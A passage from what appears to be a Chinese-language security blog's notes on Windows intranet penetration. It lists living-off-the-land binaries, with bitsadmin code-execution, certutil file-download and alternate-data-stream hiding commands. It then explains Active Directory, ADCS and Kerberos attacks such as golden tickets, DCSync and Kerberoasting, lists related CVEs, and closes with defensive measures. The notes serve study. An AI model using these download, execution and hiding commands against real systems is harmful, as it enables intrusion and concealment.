<li>复制文件  <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Complete 1 &amp; bitsadmin /reset</code></li>
<li>代码执行  <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp; bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Reset</code></li>
</ul>
</li>
<li>
<p>cdb.exe</p>
</li>
<li>
<p>certutil.exe</p>
<ul>
<li>可安装、备份、删除、管理和执行</li>
<li>证书证书存储相关功能</li>
<li>下载文件  <code>certutil -urlcache -split -f https://addr/example.exe</code></li>
<li>注意 certutil 是有 cache 的，需要显式删除</li>
<li>base64 编解码  <code>certutil -encode</code>  /  <code>certutil -decode</code></li>
</ul>
</li>
<li>
<p>cmd.exe</p>
</li>
<li>
<p>cmstp.exe</p>
</li>
<li>
<p>control.exe</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGVhcmJ5dGVzLmNvbS9ibG9nL3BsYXlpbmctYXJvdW5kLXdpdGgtbnNhLWhhY2tpbmctdG9vbHMv">加载 dll</span></li>
</ul>
</li>
<li>
<p>csc.exe</p>
<ul>
<li>编译 C# 载荷</li>
</ul>
</li>
<li>
<p>cscript.exe</p>
<ul>
<li>执行脚本</li>
</ul>
</li>
<li>
<p>extexport.exe</p>
</li>
<li>
<p>expand.exe</p>
<ul>
<li>展开一个或多个压缩文件</li>
</ul>
</li>
<li>
<p>forfiles.exe</p>
<ul>
<li><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe</code></li>
</ul>
</li>
<li>
<p>mofcomp.exe</p>
</li>
<li>
<p>makecab.exe</p>
</li>
<li>
<p>msbuild.exe</p>
<ul>
<li>构建应用程序</li>
</ul>
</li>
<li>
<p>mshta.exe</p>
<ul>
<li>HTML 应用</li>
</ul>
</li>
<li>
<p>msiexec.exe</p>
<ul>
<li>安装 msi</li>
<li>加载 dll</li>
</ul>
</li>
<li>
<p>msxsl.exe</p>
<ul>
<li>处理 XSL 程序</li>
</ul>
</li>
<li>
<p>netsh.exe</p>
</li>
<li>
<p>installutil.exe</p>
<ul>
<li>安装 / 卸载程序组件</li>
</ul>
</li>
<li>
<p>IEExec.exe</p>
<ul>
<li>.NET Framework 附带程序</li>
</ul>
</li>
<li>
<p>powershell.exe</p>
</li>
<li>
<p>psexec.exe</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wc2V4ZWM=">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</span></li>
</ul>
</li>
<li>
<p>reg.exe</p>
<ul>
<li>注册表控制台</li>
</ul>
</li>
<li>
<p>regedit.exe</p>
<ul>
<li>注册表修改</li>
</ul>
</li>
<li>
<p>regsvr32.exe</p>
<ul>
<li>注册动态链接库 / ActiveX 控件</li>
</ul>
</li>
<li>
<p>rundll32.exe</p>
<ul>
<li>执行 DLL 文件中的内部函数</li>
</ul>
</li>
<li>
<p>sc.exe</p>
<ul>
<li>查看服务状态管理</li>
</ul>
</li>
<li>
<p>schtasks.exe</p>
<ul>
<li>定时计划任务</li>
</ul>
</li>
<li>
<p>shred</p>
<ul>
<li>重复写入文件，防止文件恢复</li>
</ul>
</li>
<li>
<p>type.exe</p>
<ul>
<li>利用 ads 隐藏文件  <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></li>
</ul>
</li>
<li>
<p>wmic.exe</p>
<ul>
<li>Windows 管理工具</li>
</ul>
</li>
<li>
<p>windbg.exe</p>
</li>
<li>
<p>winrm.exe</p>
</li>
<li>
<p>wscript.exe</p>
<ul>
<li>脚本引擎</li>
</ul>
</li>
<li>
<p>waitfor.exe</p>
<ul>
<li>用于同步网络中计算机，可以发送或等待系统上的信号。</li>
</ul>
</li>
</ul>
<h1 id="msprc"><a class="anchor" href="#msprc">#</a> MSPRC</h1>
<p>MSRPC (Microsoft Remote Procedure Call) 是微软对 DCE/RPC 协议的修改实现，用于支持 Windows 系统中应用程序的远程网络调用。</p>
<p>MSRPC 所使用的端口有 UDP 135 和 TCP 139 / 445 。</p>
<p>MSRPC 可以用于</p>
<ul>
<li>用户遍历</li>
<li>服务遍历</li>
<li>凭证导出</li>
<li>横向移动</li>
<li>权限提升</li>
</ul>
<h1 id="域渗透"><a class="anchor" href="#域渗透">#</a> 域渗透</h1>
<h2 id="用户"><a class="anchor" href="#用户">#</a> 用户</h2>
<h3 id="用户组与工作组"><a class="anchor" href="#用户组与工作组">#</a> 用户组与工作组</h3>
<h4 id="用户-2"><a class="anchor" href="#用户-2">#</a> 用户</h4>
<p>Windows 系统存在一些为了特定用途而设置的用户，分别是：SYSTEM (系统)、Trustedinstaller (信任程序模块)、Everyone (所有人)、Creator Owner (创建者) 等，这些特殊用户不属于任何用户组，是完全独立的账户。其中 SYSTEM 拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。</p>
<h4 id="用户组"><a class="anchor" href="#用户组">#</a> 用户组</h4>
<p>Windows 系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。</p>
<p>默认情况下，系统为用户分了 7 个组，并给每个组赋予不同的操作权限。这些组为：管理员组 (Administrators)、高权限用户组 (Power Users)、普通用户组 (Users)、备份操作组 (Backup Operators)、文件复制组 (Replicator)、来宾用户组 (Guests)、身份验证用户组 (Authenticated Users)。</p>
<h4 id="工作组"><a class="anchor" href="#工作组">#</a> 工作组</h4>
<p>工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为 workgroup 的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。</p>
<h3 id="域中用户"><a class="anchor" href="#域中用户">#</a> 域中用户</h3>
<h4 id="域用户"><a class="anchor" href="#域用户">#</a> 域用户</h4>
<p>域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用 SID (Security Identifier) 来表明身份，用 NTLM 哈希或者 Kerberos 来验证身份。</p>
<h4 id="机器用户"><a class="anchor" href="#机器用户">#</a> 机器用户</h4>
<p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以  <code>$</code>  结尾。</p>
<h3 id="组策略"><a class="anchor" href="#组策略">#</a> 组策略</h3>
<p>组策略 (Group Policy) 用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略 (LGPO 或 LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作 GPO (Group Policy Object)。</p>
<h2 id="内网常用协议"><a class="anchor" href="#内网常用协议">#</a> 内网常用协议</h2>
<p>Windows 查询名称解析的顺序为 DNS、mDNS、LLMNR、NBNS。</p>
<h3 id="netbios"><a class="anchor" href="#netbios">#</a> NetBIOS</h3>
<p>NetBIOS（Network Basic Input/Output System）是基于网络的交互协议，通常使用 UDP 137、UDP 138、TCP 139 等端口。Windows 在安装 TCP/IP 协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。</p>
<p>基于 NetBIOS 有 NBNS (NetBIOS Name Service) 服务，通常监听在 UDP 137 端口，该服务提供三种功能：将 NetBIOS 名称解析到 IP、查询某一个 NetBIOS 节点的状态，注册 / 释放一个 NetBIOS 名。</p>
<p>可以使用  <code>nbtstat</code>  工具利用 NetBIOS 协议管理网络。</p>
<h3 id="llmnr"><a class="anchor" href="#llmnr">#</a> LLMNR</h3>
<p>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR) 是一个基于 DNS 数据包格式的协议，IPv4 和 IPv6 的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在 Windows Vista 后被引入。 LLMNR 监听 UDP 5355 端口，可以通过多播地址 224.0.0.252 (或  <code>FF02:0:0:0:0:0:1:3</code> ) 访问。</p>
<h3 id="mdns"><a class="anchor" href="#mdns">#</a> mDNS</h3>
<p>mDNS (multicast DNS) 在 Windows 10 中被引入，监听 UDP 5353 端口，对应的多播地址为 224.0.0.251 (  <code>FF02::FB</code>  ) 。mDNS 主要实现了在没有传统 DNS 服务器的情况下使局域网内的主机实现相互发现和通信。</p>
<h3 id="wpad"><a class="anchor" href="#wpad">#</a> WPAD</h3>
<p>网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用 DHCP 和 / 或 DNS 发现方法来定位一个配置文件 URL 的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定 URL 应使用的代理。</p>
<h2 id="域"><a class="anchor" href="#域">#</a> 域</h2>
<h3 id="域结构"><a class="anchor" href="#域结构">#</a> 域结构</h3>
<h4 id="域树"><a class="anchor" href="#域树">#</a> 域树</h4>
<p>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。</p>
<h4 id="林"><a class="anchor" href="#林">#</a> 林</h4>
<p>林（Forests）是一个复杂的 AD 实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</p>
<h3 id="域控制器"><a class="anchor" href="#域控制器">#</a> 域控制器</h3>
<p>ADDS 的目录存储在域控制器 (Domain Controller) 内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。</p>
<p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</p>
<p>AD 数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。</p>
<p>多主机模式可以直接更新任何一台域控制器内的 AD 对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</p>
<p>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</p>
<h3 id="信任"><a class="anchor" href="#信任">#</a> 信任</h3>
<p>两个域之间需要创建信任关系，才可以访问对应域内的资源。</p>
<h4 id="域信任类型"><a class="anchor" href="#域信任类型">#</a> 域信任类型</h4>
<p>Active Directory 的信任方式可以分为以下几种：</p>
<ul>
<li>Tree-Root Trust
<ul>
<li>双向具有转移性</li>
</ul>
</li>
<li>Parent-Child Trust
<ul>
<li>具有转移性，双向行人</li>
</ul>
</li>
<li>Forest Trust
<ul>
<li>如果两个林创建了信任关系，则林中所有的域都相互信任</li>
<li>两个林之间的信任关系无法自动扩展到其他林上</li>
</ul>
</li>
<li>Realm Trust
<ul>
<li>ADDS 域可以和非 Windows 系统的 Kerberos 域之间创建信任</li>
</ul>
</li>
<li>External Trust
<ul>
<li>位于两个林内的域之间可以通过外部信任来创建信任关系</li>
</ul>
</li>
<li>Shortcut Trust
<ul>
<li>可以缩短验证用户身份的时间</li>
</ul>
</li>
</ul>
<h3 id="ou"><a class="anchor" href="#ou">#</a> OU</h3>
<p>组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU 包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。</p>
<h2 id="active-directory"><a class="anchor" href="#active-directory">#</a> Active Directory</h2>
<p>活动目录 (Active Directory，AD) 是面向 Windows Server 的目录服务。Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。</p>
<h3 id="adds"><a class="anchor" href="#adds">#</a> ADDS</h3>
<p>Active Directory 提供目录服务的组件被称作 Active Directory 域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</p>
<p>从逻辑上看，ADDS 的组件可以分为 Partition、Schema、Domain、Domain tree、Forest、OU、Container。</p>
<p>Partition 也被称为 naming context，是 AD DS 数据库的一部分。Schema 是存储在 ADDS 中数据的定义。Container 是为 ADDS 提供组织框架的对象。</p>
<p>从实现上区分，ADDS 可以分为 Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。</p>
<p>每个域控制器都有完整的 ADDS 数据，每个域控都可以处理数据的修改并同步至其他的域控。</p>
<p>域控会有一份数据拷贝 (Data store) ，默认存储在  <code>C:\Windows\NTDS</code>  目录下。</p>
<p>Global catalog server 是存储全局 catalog 的域控，catlog 以只读的方式存储了一个 multiple-domain forest 的所有对象，用于加速搜索。</p>
<h3 id="名称空间"><a class="anchor" href="#名称空间">#</a> 名称空间</h3>
<p>名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</p>
<h3 id="对象与属性"><a class="anchor" href="#对象与属性">#</a> 对象与属性</h3>
<p>ADDS 内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征。</p>
<h2 id="adcs"><a class="anchor" href="#adcs">#</a> ADCS</h2>
<h3 id="介绍"><a class="anchor" href="#介绍">#</a> 介绍</h3>
<p>Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务。</p>
<h3 id="证书"><a class="anchor" href="#证书">#</a> 证书</h3>
<p>ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等。</p>
<p>证书常用的属性由下述字段组成</p>
<ul>
<li>Subject：主题</li>
<li>Public Key：公钥</li>
<li>Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)</li>
<li>...</li>
</ul>
<p>常用的 EKU OID 包括：</p>
<ul>
<li>代码签名
<ul>
<li>OID 1.3.6.1.5.5.7.3.3</li>
<li>证书用于签署可执行代码</li>
</ul>
</li>
<li>加密文件系统
<ul>
<li>OID 1.3.6.1.4.1.311.10.3.4</li>
<li>证书用于加密文件系统</li>
</ul>
</li>
<li>安全电子邮件
<ul>
<li>OID 1.3.6.1.5.5.7.3.4</li>
<li>证书用于加密电子邮件</li>
</ul>
</li>
<li>客户端身份验证
<ul>
<li>OID 1.3.6.1.5.5.7.3.2</li>
</ul>
</li>
<li>智能卡登录
<ul>
<li>OID 1.3.6.1.4.1.311.20.2.2</li>
</ul>
</li>
<li>服务器认证
<ul>
<li>OID 1.3.6.1.5.5.7.3.1</li>
<li>证书用于识别服务器 (例如 HTTPS 证书)</li>
</ul>
</li>
</ul>
<h4 id="证书模板"><a class="anchor" href="#证书模板">#</a> 证书模板</h4>
<p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。</p>
<h4 id="证书注册"><a class="anchor" href="#证书注册">#</a> 证书注册</h4>
<p>证书可以通过以下几种方式注册：</p>
<ul>
<li>通过 Windows 客户端证书注册协议 (MS-WCCE)</li>
<li>通过 ICertPassage 远程协议 (MS-ICPR)</li>
<li>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册</li>
<li>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册</li>
<li>在服务器安装了对应服务时，使用网络设备注册服务</li>
</ul>
<h2 id="组策略-2"><a class="anchor" href="#组策略-2">#</a> 组策略</h2>
<h3 id="简介-3"><a class="anchor" href="#简介-3">#</a> 简介</h3>
<p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。</p>
<p>组策略有以下功能：</p>
<ul>
<li>管理注册表</li>
<li>设置脚本</li>
<li>重定向文件夹</li>
<li>管理应用程序</li>
<li>指定安全选项</li>
</ul>
<h3 id="常用概念"><a class="anchor" href="#常用概念">#</a> 常用概念</h3>
<p>组策略容器 (Group Policy Container，GPC) 存储在活动目录中，包含 GPO 属性、配置信息和版本等。可以通过 GPC 来查找 GPT。</p>
<p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。</p>
<p>其中 GPC 中的信息量少、容量小，GPT 中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。</p>
<p>组策略对象 (Group Policy Object, GPO) 是包含多种 Windows 组策略设置的集合，存储在 GPC 和 GPT 中。</p>
<h2 id="域内攻击思路"><a class="anchor" href="#域内攻击思路">#</a> 域内攻击思路</h2>
<ul>
<li>获取域控权限
<ul>
<li>通过域控相关漏洞</li>
<li>抓 hash，尤其是域管理员、运维等高权限账号的哈希</li>
</ul>
</li>
<li>控制入域机器
<ul>
<li>下发恶意策略控制</li>
<li>获取域内用户凭证</li>
<li>利用错误的域管理配置</li>
<li>域内 relay</li>
</ul>
</li>
<li>获取服务票据
<ul>
<li>攻击 Exchange 等服务器</li>
</ul>
</li>
</ul>
<h2 id="攻击类型"><a class="anchor" href="#攻击类型">#</a> 攻击类型</h2>
<h3 id="黄金票据利用"><a class="anchor" href="#黄金票据利用">#</a> 黄金票据利用</h3>
<p>在认证过程中，经过 client 与 AS 的通信会得到 TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。</p>
<p>黄金票据利用需要与 DC 通信，且需要获取 krbtgt 的 hash，但是可以获取任何 Kerbose 服务权限。</p>
<h3 id="白银票据利用"><a class="anchor" href="#白银票据利用">#</a> 白银票据利用</h3>
<p>白银票据（Silver Tickets）伪造利用的是 Kerberos 认证中的第三个步骤，在第三步的时候，client 会带着 ticket 向 server 的某个服务进行请求，如果验证通过就可以访问 server 上的指定服务了，这里的 ticket 是基于 client info、server session key、end time、server hash。这里 client info 已知，end time 可以构造，server session key 是 TGS 生成的，所以只要 server 的 NTLM hash 即可。银票伪造的是 TGS，只能访问指定的服务。</p>
<h3 id="dcsync攻击"><a class="anchor" href="#dcsync攻击">#</a> DCSync 攻击</h3>
<p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLWRyc3IvZjk3N2ZhYWEtNjczZS00ZjY2LWI5YmYtNDhjNjQwMjQxZDQ3">DRSR</span> 的同步机制。</p>
<p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。</p>
<p>DCSync 就是使用这种机制进行域渗透的技术，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，在 2015 年添加到 mimikatz 的一个功能，可以导出域内所有用户的 hash。</p>
<p>这种方式需要满足以下任一一种权限：</p>
<ul>
<li>Administrators 组内的用户</li>
<li>Domain Admins 组内的用户</li>
<li>Enterprise Admins 组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
<p>或者拥有特定的几条 DACL:</p>
<ul>
<li>DS-Replication-Get-Changes</li>
<li>DS-Replication-Get-Changes-All</li>
<li>DS-Replication-Get-Changes-In-Filtered-Set</li>
</ul>
<p>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。</p>
<p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。</p>
<h3 id="dcshadow攻击"><a class="anchor" href="#dcshadow攻击">#</a> DCShadow 攻击</h3>
<p>DCShadow 是由来自法国的安全研究人员 Benjamin Delpy 和 Vincent Le Toux 在 2018 年的微软蓝帽（Blue Hat）大会上提出。</p>
<p>DCShadow 攻击指在 Active Directory 环境下创建一个恶意的域控制器，并用它来推送恶意对象。</p>
<h3 id="哈希传递攻击"><a class="anchor" href="#哈希传递攻击">#</a> 哈希传递攻击</h3>
<p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递 NTLM 哈希来认证的攻击方法，常用的工具有 mimikatz 等。</p>
<h3 id="票据传递攻击"><a class="anchor" href="#票据传递攻击">#</a> 票据传递攻击</h3>
<p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。</p>
<h3 id="kerberoasting-attacks"><a class="anchor" href="#kerberoasting-attacks">#</a> Kerberoasting Attacks</h3>
<p>Kerberoasting 攻击由 Tim Medin 在 2014 DerbyCon conference 上 <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1QVXlobE4tRTVNVQ==">公开</span> 。指域内的任何一台主机，都可以通过查询 SPN，Kerberoasting 即是向域内的所有服务请求 TGS，然后进行暴力破解。</p>
<h4 id="roasting-as-rep"><a class="anchor" href="#roasting-as-rep">#</a> Roasting AS-REP</h4>
<p>该攻击枚举域中不需要 Kerberos 预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了  <code>DONT_REQ_PREAUTH</code>  。</p>
<h3 id="kerberos-delegation-attacks"><a class="anchor" href="#kerberos-delegation-attacks">#</a> Kerberos Delegation Attacks</h3>
<p>在一个域中，A 使用 Kerberos 身份验证访问服务 B，B 再使用 A 的身份去访问 C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</p>
<p>Kerberos Delegation（Kerberos 委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</p>
<h3 id="其他漏洞利用"><a class="anchor" href="#其他漏洞利用">#</a> 其他漏洞利用</h3>
<ul>
<li>域用户提权 (CVE-2022-26923)</li>
<li>KDC bamboozling (CVE-2021-42287)</li>
<li>Name impersonation (CVE-2021-42278)</li>
<li>ProxyShell (CVE-2021-34473)</li>
<li>ProxyLogon (CVE-2021-26855)</li>
<li>PrintNightmare (CVE-2021-1675 / CVE-2021-34527)</li>
<li>SMBGhost (CVE-2020-0796)</li>
<li>Zerologon (CVE-2020-1472)</li>
<li>NTLM Relay (CVE-2019-1040)</li>
<li>永恒之蓝 (MS17-010)</li>
<li>域用户提权 (MS14-068)</li>
<li>Gpp 漏洞 (MS14-025)</li>
<li>SAMR 协议漏洞 (MS14-016)</li>
</ul>
<h2 id="防护"><a class="anchor" href="#防护">#</a> 防护</h2>
<ul>
<li>使用 ATA 等商业化防护工具</li>
<li>安装杀毒软件、EDR 等工具</li>
<li>关闭高危服务</li>
<li>统一配置防火墙策略</li>
<li>对域控等高危账号使用白名单进行行为管理</li>
<li>检测高危操作
<ul>
<li>权限提升</li>
<li>高危账号密码修改、重置</li>
</ul>
</li>
<li>行为频率建模
<ul>
<li>对大量尝试登录 / 信息查询进行报警</li>
</ul>
</li>
<li>及时安装补丁</li>
<li>对特定攻击行为进行监控
<ul>
<li>通过 GPO 下发自启动、计划任务</li>
</ul>
</li>
</ul>

      <div class="tags">
          <a href="/tags/Windows/" rel="tag"><i class="ic i-tag"></i> Windows</a>
          <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"><i class="ic i-tag"></i> 渗透</a>
          <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="ic i-tag"></i> 信息收集</a>
          <a href="/tags/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/" rel="tag"><i class="ic i-tag"></i> 痕迹清理</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2022-11-28 15:41:25" itemprop="dateModified" datetime="2022-11-28T15:41:25+08:00">2022-11-28</time>
  </span>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>晓楼 <i class="ic i-at"><em>@</em></i>Khala
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="Windows内网渗透">https://mobius-0.github.io/security/WebNote/Intranet penetration/Windows内网渗透/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/security/WebNote/Languages%20and%20Frameworks/CSharp/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;11&#x2F;24&#x2F;Vpbd7lLA8BX6kiq.png" title="C#">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> 语言与框架</span>
  <h3>C#</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;11&#x2F;29&#x2F;YUIx6gkPJtBlaLm.png" title="Linux内网渗透">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> 内网渗透</span>
  <h3>Linux内网渗透</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text"> 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> 基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.</span> <span class="toc-text"> 域信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.</span> <span class="toc-text"> 用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.</span> <span class="toc-text"> 网络信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.5.</span> <span class="toc-text"> 防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-number">1.6.</span> <span class="toc-text"> 密码信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.7.</span> <span class="toc-text"> 票据信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.</span> <span class="toc-text"> 特殊文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B1%80%E5%9F%9F%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.9.</span> <span class="toc-text"> 局域网存活主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.10.</span> <span class="toc-text"> 其他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text"> 持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text"> 隐藏文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">2.2.</span> <span class="toc-text"> 后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sethc"><span class="toc-number">2.2.1.</span> <span class="toc-text"> sethc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 映像劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 定时任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.4.</span> <span class="toc-text"> 登录脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.2.5.</span> <span class="toc-text"> 屏幕保护程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7"><span class="toc-number">2.2.6.</span> <span class="toc-text"> 隐藏用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#clr"><span class="toc-number">2.2.7.</span> <span class="toc-text"> CLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#winlogon-helper-dll%E5%90%8E%E9%97%A8"><span class="toc-number">2.2.8.</span> <span 